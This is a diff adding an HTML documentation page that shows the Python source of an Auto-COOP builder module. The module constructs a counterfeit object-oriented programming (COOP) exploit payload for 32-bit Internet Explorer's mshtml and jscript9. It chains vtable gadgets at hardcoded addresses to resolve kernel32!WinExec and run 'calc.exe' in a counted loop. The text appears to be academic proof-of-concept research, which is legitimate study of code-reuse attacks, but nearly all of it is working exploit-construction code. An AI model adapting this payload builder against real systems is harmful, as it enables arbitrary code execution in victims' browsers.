@@ -1,0 +1,367 @@
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge" />
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>autocoop.builder.exp_mshtml_dummy_32 &#8212; Auto-COOP  documentation</title>
+    <link rel="stylesheet" href="../../../_static/alabaster.css" type="text/css" />
+    <link rel="stylesheet" href="../../../_static/pygments.css" type="text/css" />
+    <script type="text/javascript" id="documentation_options" data-url_root="../../../" src="../../../_static/documentation_options.js"></script>
+    <script type="text/javascript" src="../../../_static/jquery.js"></script>
+    <script type="text/javascript" src="../../../_static/underscore.js"></script>
+    <script type="text/javascript" src="../../../_static/doctools.js"></script>
+    <link rel="index" title="Index" href="../../../genindex.html" />
+    <link rel="search" title="Search" href="../../../search.html" />
+   
+  <link rel="stylesheet" href="../../../_static/custom.css" type="text/css" />
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=0.9, maximum-scale=0.9" />
+
+  </head><body>
+  
+
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          
+
+          <div class="body" role="main">
+            
+  <h1>Source code for autocoop.builder.exp_mshtml_dummy_32</h1><div class="highlight"><pre>
+<span></span><span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">builder</span> <span class="k">import</span> <span class="o">*</span>
+
+<div class="viewcode-block" id="LABEL"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.exp_mshtml_dummy_32.LABEL">[docs]</a><span class="k">class</span> <span class="nc">LABEL</span><span class="p">:</span>
+    <span class="n">MAIN_ARG</span><span class="p">,</span> <span class="n">LINKED_LIST</span><span class="p">,</span> <span class="n">A</span><span class="p">,</span> <span class="n">B</span><span class="p">,</span> <span class="n">COUNTER_OVERFLOW</span><span class="p">,</span> <span class="n">ITEM_END_OF_LOOP</span> <span class="o">=</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span></div>
+
+
+<span class="k">def</span> <span class="nf">_createInitObject</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">):</span>
+
+    <span class="n">VINDEX_INIT</span> <span class="o">=</span> <span class="mi">0</span>
+    <span class="c1"># pointer to vtable entry of loop gadget</span>
+    <span class="n">ADDR_PTR_CALL_GADGET</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="s2">&quot;jscript9&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x1000986C</span><span class="p">)</span>
+    <span class="c1"># pointer to random writable memory in .data section </span>
+    <span class="n">ADDR_SCRATCH_AREA</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="s2">&quot;jscript9&quot;</span><span class="p">]</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x103C8DE2</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; Create initial object that transfers control to the looped call gadget:</span>
+<span class="sd">    jscript9!ThreadContext::ResolveExternalWeakReferencedObjects()</span>
+
+<span class="sd">    Important offsets:</span>
+<span class="sd">        + 0x140: first argument pushed to each method. </span>
+<span class="sd">            We place a pointer to writable memory here that we use as scratch area. We label this important location with MAIN_ARG.</span>
+<span class="sd">        + 0x3ac: first item in the linked list that is traversed in looped call gadget. Both Item.next and Item.p are initially loaded with this pointer in the gadget.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+
+    <span class="n">objInit</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">(</span><span class="n">fixedOffset</span><span class="o">=</span><span class="mi">0</span><span class="p">)</span>
+    <span class="n">objInit</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">ADDR_PTR_CALL_GADGET</span><span class="p">,</span> <span class="n">VINDEX_INIT</span><span class="p">)</span>
+    <span class="n">objInit</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addPointer</span><span class="p">(</span><span class="mh">0x140</span><span class="p">,</span> <span class="n">ADDR_SCRATCH_AREA</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">MAIN_ARG</span><span class="p">)</span> 
+    <span class="c1"># we invalidate the next 3 dwords because they are written by Layout::SvgBoxBuilder::PrepareBoxForDisplay</span>
+    <span class="n">objInit</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">invalidate</span><span class="p">(</span><span class="mh">0x140</span> <span class="o">+</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">12</span><span class="p">)</span>
+
+    <span class="n">objInit</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="mh">0x3ac</span><span class="p">,</span> <span class="n">LinkedListBuilder</span><span class="o">.</span><span class="n">LABEL_BASE_LL</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">objInit</span>
+
+<div class="viewcode-block" id="build"><a class="viewcode-back" href="../../../autocoop.builder.html#autocoop.builder.exp_mshtml_dummy_32.build">[docs]</a><span class="k">def</span> <span class="nf">build</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">,</span> <span class="n">maxOffset</span><span class="p">):</span>
+    <span class="sd">&quot;&quot;&quot; Invokes WinExec(&#39;calc.exe&#39;, &lt;something&gt;) </span>
+<span class="sd">    @param r Dictionary containing relocatrors for various dlls.</span>
+<span class="sd">    @param baseBuff Base address of buffer under control.</span>
+<span class="sd">    @param maxOffset Size of buffer under control.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">rj</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="s2">&quot;jscript9&quot;</span><span class="p">]</span>
+    <span class="n">rm</span> <span class="o">=</span> <span class="n">r</span><span class="p">[</span><span class="s2">&quot;mshtml&quot;</span><span class="p">]</span>
+
+    <span class="c1"># constants</span>
+    <span class="n">VINDEX_MAIN</span> <span class="o">=</span> <span class="mi">1</span>
+    <span class="n">ADDR_K32_IMPORT</span> <span class="o">=</span> <span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x644A5204</span><span class="p">)</span> <span class="c1"># address of Thread32First import</span>
+    <span class="n">OFFSET_K32_IMPORT_WINEXEC</span> <span class="o">=</span> <span class="p">(</span><span class="mh">0x6B842927</span> <span class="o">-</span> <span class="mh">0x6B845DE3</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x10000000</span> <span class="c1"># offset from WinExec to Thread32First</span>
+
+    <span class="c1"># create init object/buffer</span>
+    <span class="n">objMain</span> <span class="o">=</span> <span class="n">_createInitObject</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">baseBuff</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; create builder for other objects. Our ML-G is linked list-based. The item layout is as follows:</span>
+<span class="sd">    </span>
+<span class="sd">    template &lt;typename T&gt;</span>
+<span class="sd">    struct Item</span>
+<span class="sd">    {</span>
+<span class="sd">        Item&lt;T&gt;* next;</span>
+<span class="sd">        T* p;</span>
+<span class="sd">    }; </span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">b</span> <span class="o">=</span> <span class="n">LinkedListBuilder</span><span class="p">(</span><span class="n">baseBuff</span><span class="p">,</span> <span class="n">offsetPtrObj</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">offsetPtrNext</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">mainObj</span><span class="o">=</span><span class="n">objMain</span><span class="p">,</span> <span class="n">arch</span><span class="o">=</span><span class="n">Arch</span><span class="o">.</span><span class="n">X86</span><span class="p">())</span>
+
+    <span class="sd">&quot;&quot;&quot; Create compensator gadget for gadgets that have more than one argument.</span>
+<span class="sd">    Any virtual function expecting no arguments can be used here (like CAsymmetricSignVerifyParams::GetPaddingInfo).</span>
+<span class="sd">    For the given loop gadget, we can compensate one argument at a time.</span>
+<span class="sd">    &quot;&quot;&quot;</span> 
+    <span class="n">objComp</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">objComp</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x63CFA214</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+
+    <span class="c1"># create other objects</span>
+    <span class="sd">&quot;&quot;&quot; CDataTransfer::Proxy(CDataTransfer *this, struct COmWindowProxy **)</span>
+<span class="sd">        dword ptr [esp]  =&gt;  ebp</span>
+<span class="sd">        dword ptr [dword ptr [esp+4]]  =&gt;  dword ptr [dword ptr [ecx+1ch]+44h]</span>
+<span class="sd">        eax  =&gt;  0</span>
+<span class="sd">        ecx  =&gt;  dword ptr [dword ptr [ecx+1ch]+44h]</span>
+
+<span class="sd">    Writes [[this+1ch]+44h] to scratch area.</span>
+
+<span class="sd">    We use this to load a pointer to kernel32.dll</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x63583198</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addPointer</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span> <span class="n">ADDR_K32_IMPORT</span> <span class="o">-</span> <span class="mh">0x44</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; CDCompSwapChainLayer::SetDesiredSize(CDCompSwapChainLayer *this, const struct CSize *)</span>
+<span class="sd">        dword ptr [esp]  =&gt;  ebp</span>
+<span class="sd">        dword ptr [ecx+14h]  =&gt;  dword ptr [dword ptr [esp+4]]</span>
+<span class="sd">        dword ptr [ecx+18h]  =&gt;  dword ptr [dword ptr [esp+4]+4]</span>
+<span class="sd">        eax  =&gt;  0</span>
+<span class="sd">        edx  =&gt;  dword ptr [esp+4]</span>
+
+<span class="sd">    Loads this+14h from scratch area. Overwrites this+18h.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x635CC560</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="c1"># pointer to kernel32 is written to label A</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="mh">0x14</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">A</span><span class="p">)</span>
+    <span class="c1"># offset +18h is invalidated in this gadget</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">invalidate</span><span class="p">(</span><span class="mh">0x18</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+    <span class="c1"># add object</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; CDCompSurfaceTargetSurface::GetOrigin(void*)</span>
+<span class="sd">        dword ptr [esp]  =&gt;  ebp</span>
+<span class="sd">        dword ptr [dword ptr [esp+4]]  =&gt;  dword ptr [ecx+24h]-dword ptr [ecx+14h]</span>
+<span class="sd">        dword ptr [dword ptr [esp+4]+4]  =&gt;  dword ptr [ecx+28h]-dword ptr [ecx+18h]</span>
+<span class="sd">        eax  =&gt;  dword ptr [esp+4]</span>
+<span class="sd">        ecx  =&gt;  dword ptr [ecx+18h]</span>
+<span class="sd">        edx  =&gt;  dword ptr [ecx+14h]</span>
+
+<span class="sd">    Writes [this+24h] - [this+14h] to scratch area.</span>
+<span class="sd">    After this we have the address of kernel32!WinExec in the scratch area.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x6367EAA0</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="c1"># we label this+24h and not this+14h with A, otherwise this would conflict with the previous gadget. </span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="mh">0x24</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">A</span><span class="p">)</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addDword</span><span class="p">(</span><span class="mh">0x14</span><span class="p">,</span> <span class="p">(</span><span class="o">-</span><span class="n">OFFSET_K32_IMPORT_WINEXEC</span><span class="p">)</span> <span class="o">%</span> <span class="mh">0x10000000</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; CDCompSurfaceBackedLayer::SetOnePixelOptimizedColor(CDCompSurfaceBackedLayer *this, const struct CColorValue *)</span>
+<span class="sd">        dword ptr [esp]  =&gt;  ebp</span>
+<span class="sd">        dword ptr [ecx+6ch]  =&gt;  dword ptr [dword ptr [esp+4]]</span>
+<span class="sd">        dword ptr [ecx+70h]  =&gt;  dword ptr [dword ptr [esp+4]+4]</span>
+<span class="sd">        eax  =&gt;  dword ptr [dword ptr [esp+4]+4]</span>
+<span class="sd">        edx  =&gt;  dword ptr [esp+4]</span>
+
+<span class="sd">    Load pointer to WinExec from scratch area to ecx+6c. Invalidates ecx+70.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x6367DF38</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="c1"># pointer to WinExec is written to +0x6c</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">invalidate</span><span class="p">(</span><span class="mh">0x70</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">4</span><span class="p">)</span>
+    <span class="c1"># write &quot;calc.exe&quot; 0x10 bytes before the pointer to winexec, label the whole thing with B</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addData</span><span class="p">(</span><span class="mh">0x6c</span> <span class="o">-</span> <span class="mh">0x10</span><span class="p">,</span> <span class="s2">&quot;calc.exe</span><span class="se">\0</span><span class="s2">&quot;</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">B</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; Layout::SvgBoxBuilder::PrepareBoxForDisplay(Layout::SvgBoxBuilder *__hidden this)</span>
+<span class="sd">        dword ptr [dword ptr [ecx+10h]+28h]  =&gt;  dword ptr [ecx+80h]</span>
+<span class="sd">        dword ptr [dword ptr [ecx+10h]+2ch]  =&gt;  dword ptr [ecx+84h]</span>
+<span class="sd">        dword ptr [dword ptr [ecx+10h]+30h]  =&gt;  dword ptr [ecx+88h]</span>
+<span class="sd">        dword ptr [dword ptr [ecx+10h]+34h]  =&gt;  dword ptr [ecx+8ch]</span>
+<span class="sd">        eax  =&gt;  dword ptr [ecx+8ch]</span>
+<span class="sd">        edx  =&gt;  dword ptr [ecx+10h]</span>
+
+<span class="sd">    Overwrites MAIN_ARG with pointer to label B.</span>
+<span class="sd">    In our object, the pointer to label B needs to be at offset 0x80.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x635D058C</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="c1"># add two unresolved pointers</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">B</span><span class="p">)</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">MAIN_ARG</span><span class="p">,</span> <span class="n">targetOffset</span><span class="o">=-</span><span class="mh">0x28</span><span class="p">)</span>
+    <span class="c1">#</span>
+    <span class="c1"># this is the head of our loop</span>
+    <span class="c1">#</span>
+    <span class="n">olLoopHead</span> <span class="o">=</span> <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; At this point we have everything in place.</span>
+<span class="sd">    We now just need to invoke our compensator gadget to have the new MAIN_ARG lying on the top of the stack twice (arg0 and arg1) when we call teh invocation gadget.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">objComp</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">objComp</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot;  Microsoft::WRL::Callback&lt;Windows::Foundation::ITypedEventHandler&lt;IInspectable *,Windows::UI::Core::TouchHitTestingEventArgs *&gt;,CCoreHostedEventHandler,IInspectable *,Windows::UI::Core::ITouchHitTestingEventArgs *&gt;&#39;::`2&#39;::ComObject::Invoke</span>
+<span class="sd">        </span>
+<span class="sd">        dword ptr [esp]  =&gt;  ebp</span>
+<span class="sd">        dword ptr [esp-4]  =&gt;  dword ptr [esp+0ch]</span>
+<span class="sd">        dword ptr [esp-8]  =&gt;  dword ptr [esp+8]</span>
+<span class="sd">        eax  =&gt;  dword ptr [esp+4]</span>
+<span class="sd">        ecx  =&gt;  dword ptr [dword ptr [esp+4]+0ch]</span>
+<span class="sd">        esp  =&gt;  (esp-0ch)</span>
+<span class="sd">        ebp  =&gt;  (esp-4)</span>
+
+<span class="sd">        call    dword ptr [dword ptr [esp+4]+10h]</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="c1"># the final object just needs to have a vptr :-)</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x63A9D5CC</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+
+    <span class="c1">#</span>
+    <span class="c1"># at this point, WinExec(calc.exe) has been executed, next up is our loop condition check</span>
+    <span class="c1">#</span>
+    <span class="sd">&quot;&quot;&quot; CMemoryStream::IncreaseIndent(CMemoryStream *__hidden this)</span>
+<span class="sd">    dword ptr [ecx+8]  =&gt;  dword ptr [ecx+8]+1</span>
+
+<span class="sd">    Increment counter.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x638CF914</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addByte</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">byte</span><span class="o">=</span><span class="p">(</span><span class="o">-</span><span class="mi">5</span> <span class="o">%</span> <span class="mh">0x100</span><span class="p">))</span> <span class="c1"># we want the counter to overflow after five iterations</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addByte</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="n">byte</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">COUNTER_OVERFLOW</span><span class="p">)</span> <span class="c1"># if byte +8 overflows, this byte switchtes from 1 to 2 :-)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; Layout::SvgBoxBuilder::PrepareBoxForDisplay(Layout::SvgBoxBuilder *__hidden this)</span>
+<span class="sd">        dword ptr [dword ptr [ecx+10h]+28h]  =&gt;  dword ptr [ecx+80h]</span>
+<span class="sd">        dword ptr [dword ptr [ecx+10h]+2ch]  =&gt;  dword ptr [ecx+84h]</span>
+<span class="sd">        dword ptr [dword ptr [ecx+10h]+30h]  =&gt;  dword ptr [ecx+88h]</span>
+<span class="sd">        dword ptr [dword ptr [ecx+10h]+34h]  =&gt;  dword ptr [ecx+8ch]</span>
+<span class="sd">        eax  =&gt;  dword ptr [ecx+8ch]</span>
+<span class="sd">        edx  =&gt;  dword ptr [ecx+10h]</span>
+
+<span class="sd">    Write pointer alternative Item pointer to scratch area.</span>
+<span class="sd">    In our object, the pointer to label B needs to be at offset 0x80.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x635D058C</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+
+    <span class="c1"># this is the pointer to the item that is to be executed after the loop (here it is the NOP item)</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="mh">0x80</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">ITEM_END_OF_LOOP</span><span class="p">)</span> 
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addUnresolvedPointer</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">targetLabel</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">MAIN_ARG</span><span class="p">,</span> <span class="n">targetOffset</span><span class="o">=-</span><span class="mh">0x28</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; Ptls6::CLsDnodeNonTextObject::SetDurFmtCore(Ptls6::CLsDnodeNonTextObject *this, __int32)</span>
+<span class="sd">        dword ptr [esp]  =&gt;  ebp</span>
+<span class="sd">        dword ptr [ecx+10h]  =&gt;  dword ptr [esp+4]</span>
+<span class="sd">        eax  =&gt;  dword ptr [esp+4]</span>
+<span class="sd">        esp  =&gt;  (esp-4)</span>
+<span class="sd">        ebp  =&gt;  (esp-4)</span>
+
+<span class="sd">        if [ecx+6ch] &amp; 1</span>
+<span class="sd">        [ecx+1Ch] =&gt; dword ptr [esp+4]</span>
+
+<span class="sd">    Check if counter overflew.</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x637ECFD4</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="n">offset</span><span class="o">=</span><span class="mh">0x6c</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">1</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">COUNTER_OVERFLOW</span><span class="p">)</span> <span class="c1"># when our counter overflows, LABEL.C switches from 1 to 0</span>
+
+    <span class="c1"># we make offset 1ch overlap with the next pointer of the ll item of the loop head, this results in the loop exiting.</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">mem</span><span class="o">.</span><span class="n">addLabel</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mi">4</span><span class="p">,</span> <span class="n">label</span><span class="o">=</span><span class="n">olLoopHead</span><span class="o">.</span><span class="n">labelLlItem</span><span class="p">)</span>
+
+    <span class="c1">#</span>
+    <span class="c1"># we loop back to the loop head.</span>
+    <span class="c1">#</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">labelNextItem</span><span class="o">=</span><span class="n">olLoopHead</span><span class="o">.</span><span class="n">labelLlItem</span><span class="p">)</span>
+
+    <span class="sd">&quot;&quot;&quot; CCryptoOperation::CreateExtendedResult(CCryptoOperation *this, struct CCryptoOperationResult **)</span>
+<span class="sd">    NOP</span>
+<span class="sd">    &quot;&quot;&quot;</span>
+    <span class="n">obj</span> <span class="o">=</span> <span class="n">Obj32</span><span class="p">()</span>
+    <span class="n">obj</span><span class="o">.</span><span class="n">setVptr</span><span class="p">(</span><span class="n">rm</span><span class="o">.</span><span class="n">ptr</span><span class="p">(</span><span class="mh">0x635A28A4</span><span class="p">),</span> <span class="n">VINDEX_MAIN</span><span class="p">)</span>
+    <span class="n">b</span><span class="o">.</span><span class="n">addObj</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="n">labelNextItem</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">ITEM_END_OF_LOOP</span><span class="p">,</span> <span class="n">labelItem</span><span class="o">=</span><span class="n">LABEL</span><span class="o">.</span><span class="n">ITEM_END_OF_LOOP</span><span class="p">)</span>
+
+    <span class="k">return</span> <span class="n">b</span><span class="o">.</span><span class="n">finalize</span><span class="p">(</span><span class="n">maxOffset</span><span class="p">)</span></div>
+    
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">5</span><span class="p">:</span>
+        <span class="nb">print</span> <span class="s2">&quot;Usage: </span><span class="si">%s</span><span class="s2"> &lt;mshtml base&gt; &lt;jscript9 base&gt; &lt;buffer base&gt; &lt;output path&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+    <span class="c1"># parse arguments</span>
+    <span class="n">baseMshtml</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">baseJScript</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+    <span class="n">baseBuff</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
+
+    <span class="c1"># create relocators</span>
